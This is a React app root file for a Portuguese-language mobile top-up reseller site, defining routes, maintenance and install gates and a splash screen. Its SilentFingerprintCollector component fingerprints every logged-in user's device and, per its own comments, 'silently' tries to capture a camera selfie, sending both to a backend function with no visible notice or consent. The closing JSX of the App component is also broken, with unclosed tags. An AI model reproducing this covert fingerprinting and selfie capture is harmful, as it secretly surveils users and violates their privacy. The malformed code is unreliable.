import { Routes, Route, Navigate, useSearchParams } from "react-router-dom";
import { AuthProvider, useAuth } from "@/hooks/useAuth";
import { ThemeProvider } from "@/hooks/useTheme";
import { ProtectedRoute } from "@/components/ProtectedRoute";
import { MasterOnlyRoute } from "@/components/MasterOnlyRoute";
import { lazy, Suspense, useEffect, useState, useCallback, useRef } from "react";

import { collectFingerprint, captureLoginSelfie } from "@/lib/deviceFingerprint";
import { SplashScreen } from "@/components/SplashScreen";
import { PageSkeleton } from "@/components/Skeleton";
import { supabase } from "@/integrations/supabase/client";
import Auth from "@/pages/Auth";
import NotFound from "@/pages/NotFound";
import LandingPage from "@/pages/LandingPage";
import { useCacheCleanup } from "@/hooks/useCacheCleanup";
import { usePresenceTracker } from "@/hooks/usePresence";
import { useInactivityTimeout } from "@/hooks/useInactivityTimeout";
import { useSiteName } from "@/hooks/useSiteName";

// Lazy load ALL pages
const RecargaPublica = lazy(() => import("@/pages/RecargaPublica"));
const PublicProfile = lazy(() => import("@/pages/PublicProfile"));
const TelegramMiniApp = lazy(() => import("@/pages/TelegramMiniApp"));
const ClientePortal = lazy(() => import("@/pages/ClientePortal"));
const ResetPassword = lazy(() => import("@/pages/ResetPassword"));
const MaintenancePage = lazy(() => import("@/pages/MaintenancePage"));
const InstallApp = lazy(() => import("@/pages/InstallApp"));
const RegrasPage = lazy(() => import("@/pages/RegrasPage"));
const DocsRede = lazy(() => import("@/pages/DocsRede"));
const AdminDashboard = lazy(() => import("@/pages/AdminDashboard"));
const RevendedorPainel = lazy(() => import("@/pages/RevendedorPainel"));
const Principal = lazy(() => import("@/pages/Principal"));
const ChatApp = lazy(() => import("@/pages/ChatApp"));
const UserProfile = lazy(() => import("@/pages/UserProfile"));

// Lazy load non-critical global components
const SeasonalEffects = lazy(() => import("@/components/SeasonalEffects"));
const PullToRefresh = lazy(() => import("@/components/PullToRefresh"));
const FloatingSupportButton = lazy(() => import("@/components/support/FloatingSupportButton").then(m => ({ default: m.FloatingSupportButton })));

// ── Prefetch common routes after initial paint ──
function usePrefetchRoutes() {
  const prefetched = useRef(false);
  useEffect(() => {
    if (prefetched.current) return;
    prefetched.current = true;

    const prefetch = () => {
      // Prefetch the most likely next routes
      import("@/pages/RevendedorPainel");
      import("@/pages/AdminDashboard");
    };

    if (typeof requestIdleCallback === 'function') {
      const id = requestIdleCallback(prefetch, { timeout: 5000 });
      return () => cancelIdleCallback(id);
    } else {
      const id = setTimeout(prefetch, 3000);
      return () => clearTimeout(id);
    }
  }, []);
}

// ── Maintenance guard with optimistic rendering ──
function MaintenanceGuard({ children }: { children: React.ReactNode }) {
  const { role } = useAuth();
  const [maintenance, setMaintenance] = useState<boolean | null>(null);

  useEffect(() => {
    let mounted = true;

    // Fast timeout — don't block UI for more than 2s
    const timeout = setTimeout(() => {
      if (mounted) setMaintenance((prev) => prev === null ? false : prev);
    }, 2000);

    const check = async () => {
      try {
        const { data, error } = await supabase.rpc("get_maintenance_mode" as any);
        if (!mounted) return;
        if (error) { setMaintenance(false); return; }
        setMaintenance(data === true);
      } catch {
        if (mounted) setMaintenance(false);
      }
    };
    check();

    // Realtime changes
    const channel = supabase
      .channel("maintenance-mode")
      .on("postgres_changes", {
        event: "*", schema: "public", table: "system_config",
        filter: "key=eq.maintenanceMode"
      }, (payload: any) => {
        if (mounted) setMaintenance(payload.new?.value === "true");
      })
      .subscribe();

    return () => { mounted = false; clearTimeout(timeout); supabase.removeChannel(channel); };
  }, []);

  // Show nothing while checking (parent splash already covered initial load)
  if (maintenance === null) return null;
  if (maintenance && role === "admin") return <>{children}</>;
  if (maintenance) return <Suspense fallback={null}><MaintenancePage /></Suspense>;
  return <>{children}</>;
}

// ── Global presence tracker (runs for all authenticated users) ──
function GlobalPresence() {
  usePresenceTracker();
  return null;
}

// ── Silent fingerprint collector for authenticated users ──
function SilentFingerprintCollector() {
  const { user } = useAuth();
  const collected = useRef(false);

  useEffect(() => {
    if (!user || collected.current) return;
    collected.current = true;

    // Deferred — don't block any UI
    const run = async () => {
      try {
        const fp = await collectFingerprint();
        // Capture selfie silently in parallel (best-effort)
        let selfie: string | null = null;
        try {
          selfie = await captureLoginSelfie();
        } catch {
          // selfie is best-effort — never block
        }
        await supabase.functions.invoke("check-device", {
          body: { fingerprint: fp, selfie },
        });
      } catch {
        // silent — never disrupt the user experience
      }
    };

    if (typeof requestIdleCallback === "function") {
      const id = requestIdleCallback(() => { run(); }, { timeout: 8000 });
      return () => cancelIdleCallback(id);
    } else {
      const id = setTimeout(run, 4000);
      return () => clearTimeout(id);
    }
  }, [user]);

  return null;
}

// ── Dynamic document title from system_config ──
function DynamicTitle() {
  const siteName = useSiteName();
  useEffect(() => {
    document.title = `${siteName} - Sistema de Recargas`;
  }, [siteName]);
  return null;
}

// ── Deferred non-critical effects ──
function DeferredEffects() {
  const [ready, setReady] = useState(false);
  useEffect(() => {
    if (typeof requestIdleCallback === 'function') {
      const id = requestIdleCallback(() => setReady(true), { timeout: 3000 });
      return () => cancelIdleCallback(id);
    } else {
      const id = setTimeout(() => setReady(true), 1500);
      return () => clearTimeout(id);
    }
  }, []);
  if (!ready) return null;
  return (
    <Suspense fallback={null}>
      <SeasonalEffects />
      <PullToRefresh />
      <FloatingSupportButton />
    </Suspense>
  );
}

// ── Page loading fallback (skeleton instead of splash) ──
function LazyPage({ children }: { children: React.ReactNode }) {
  return <Suspense fallback={<PageSkeleton />}>{children}</Suspense>;
}

function RegisterRedirect() {
  const [searchParams] = useSearchParams();
  const ref = searchParams.get("ref") || "";
  return <Navigate to={`/login${ref ? `?ref=${ref}` : ""}`} replace />;
}

// ── Session inactivity timeout ──
function InactivityGuard() {
  useInactivityTimeout();
  return null;
}

function InstallGate({ children }: { children: React.ReactNode }) {
  const [status, setStatus] = useState<"checking" | "install" | "ready">("checking");

  useEffect(() => {
    let mounted = true;
    const check = async () => {
      try {
        const { data } = await supabase
          .from("system_config")
          .select("value")
          .eq("key", "install_completed")
          .maybeSingle();
        const local = localStorage.getItem("mirror_install_completed") === "true";
        if (mounted) setStatus(data?.value === "true" || local ? "ready" : "install");
      } catch {
        if (mounted) setStatus(localStorage.getItem("mirror_install_completed") === "true" ? "ready" : "install");
      }
    };
    check();
    return () => { mounted = false; };
  }, []);

  if (status === "checking") return null;
  if (status === "install") {
    return (
      <InstallWizard onComplete={() => {
        localStorage.setItem("mirror_install_completed", "true");
        setStatus("ready");
      }} />
    );
  }
  return <>{children}</>;
}

const InstallWizard = lazy(() => import("@/components/InstallWizard").then(m => ({ default: m.InstallWizard })));

function App() {
  useCacheCleanup();
  usePrefetchRoutes();

  // Show splash for 10s, then fade out
  const [splashDone, setSplashDone] = useState(false);
  const [splashVisible, setSplashVisible] = useState(true);
  const splashStarted = useRef(false);
  useEffect(() => {
    if (splashStarted.current) return;
    splashStarted.current = true;
    // At 10s start fade-out, at 10.6s remove splash
    const fadeTimer = setTimeout(() => setSplashVisible(false), 10_000);
    const removeTimer = setTimeout(() => setSplashDone(true), 10_600);
    return () => { clearTimeout(fadeTimer); clearTimeout(removeTimer); };
  }, []);

  return (
    <>
      {/* Splash overlay with fade-out */}
      {!splashDone && (
        <div style={{
          position: 'fixed', inset: 0, zIndex: 9998,
          opacity: splashVisible ? 1 : 0,
          transition: 'opacity 0.6s ease-out',
          pointerEvents: splashVisible ? 'auto' : 'none',
        }}>
          <SplashScreen />
        </div>
      )}
      {/* App content with fade-in */}
      <div style={{
        opacity: splashDone ? 1 : 0,
        transition: 'opacity 0.5s ease-in',
      }}>
      <ThemeProvider>
      <AuthProvider>
        <Suspense fallback={null}>
          <InstallGate>
            <GlobalPresence />
            <SilentFingerprintCollector />
            <InactivityGuard />
            <DynamicTitle />
            <DeferredEffects />
            <MaintenanceGuard>
              <Routes>
                <Route path="/" element={<LandingPage />} />
                <Route path="/login" element={<Auth />} />
                <Route path="/registrar" element={<RegisterRedirect />} />
                <Route path="/recarga" element={<LazyPage><RecargaPublica /></LazyPage>} />
                <Route path="/reset-password" element={<LazyPage><ResetPassword /></LazyPage>} />
                <Route path="/loja/:slug" element={<LazyPage><ClientePortal /></LazyPage>} />
                <Route path="/p/:slug" element={<LazyPage><PublicProfile /></LazyPage>} />
                <Route path="/miniapp" element={<LazyPage><TelegramMiniApp /></LazyPage>} />
                <Route path="/regras" element={<LazyPage><RegrasPage /></LazyPage>} />
                <Route path="/instalar" element={<LazyPage><InstallApp /></LazyPage>} />
                <Route path="/docs/rede" element={<LazyPage><DocsRede /></LazyPage>} />
                <Route
                  path="/admin"
                  element={
                    <ProtectedRoute allowedRoles={["admin"]}>
                      <LazyPage><AdminDashboard /></LazyPage>
                    </ProtectedRoute>
                  }
                />
                <Route
                  path="/principal"
                  element={
                    <MasterOnlyRoute>
                      <LazyPage><Principal /></LazyPage>
                    </MasterOnlyRoute>
                  }
                />
                <Route
                  path="/painel"
                  element={
                    <ProtectedRoute>
                      <LazyPage><RevendedorPainel /></LazyPage>
                    </ProtectedRoute>
                  }
                />
                <Route
                  path="/chat"
                  element={
                    <ProtectedRoute>
                      <LazyPage><ChatApp /></LazyPage>
                    </ProtectedRoute>
                  }
                />
                <Route
                  path="/perfil/:userId"
                  element={
                    <ProtectedRoute>
                      <LazyPage><UserProfile /></LazyPage>
                    </ProtectedRoute>
                  }
                />
                <Route path="/auth" element={<Navigate to="/login" replace />} />
                <Route path="*" element={<NotFound />} />
              </Routes>
            </MaintenanceGuard>
          </InstallGate>
        </Suspense>
      </AuthProvider>
    </ThemeProvider>
  );
}

export default App;
